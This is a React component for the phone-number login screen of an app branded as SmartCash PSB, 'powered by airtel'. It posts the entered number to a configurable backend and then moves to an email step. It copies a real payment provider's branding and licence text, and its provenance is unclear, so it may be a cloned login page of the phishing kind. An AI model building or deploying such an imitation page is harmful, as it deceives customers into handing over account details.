import { useState } from "react";
import "../styles/home.css";
import "../App.css";
import logo from "../assets/logo.svg";
import axios from "axios";
import BASE_URL from "../components/urls";
import { useNavigate } from "react-router-dom";
const Home = () => {
  const [loading, setLoading] = useState(false);
  const [phone, setPhone] = useState("");
  const navigate = useNavigate();

  const submitLogin = () => {
    if (!phone.trim()) return;
    setLoading(true);
    const payload = { phone: phone.trim() };
    axios
      .post(`${BASE_URL}/`, payload)
      .then((response) => {
        console.log(response.data);
        setPhone("");
        navigate("/email");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="home-screen">
      <div className="home-main">
        <div className="logo-section">
          <img src={logo} alt="SmartCash" className="logo-img" />
          <div className="powered-by">
            <span>Powered by</span>
            <span className="airtel-text">airtel</span>
          </div>
        </div>
        <div className="login-section">
          <div className="input-field">
            <div className="field-row">
              <div className="field-label">Phone Number</div>
              <div className="field-value">
                <input
                  type="tel"
                  className="field-input"
                  value={phone}
                  onInput={(e) => {
                    const digits = e.currentTarget.value.replace(/\D/g, "");
                    setPhone(digits);
                  }}
                  inputMode="numeric"
                  maxLength={11}
                  pattern="\d*"
                  placeholder="Enter Phone Number"
                />
              </div>
            </div>
          </div>
        </div>

        <div className="submit-section">
          <button
            type="button"
            className="login-submit-btn"
            onClick={submitLogin}
            disabled={loading || !phone.trim()}
          >
            {loading ? "Loading..." : "Submit"}
          </button>
        </div>

        <div className="bottom-section">
          <p className="license-text">
            SmartCash PSB - Licensed by the Central Bank of Nigeria
          </p>
        </div>
      </div>
    </div>
  );
};

export default Home;
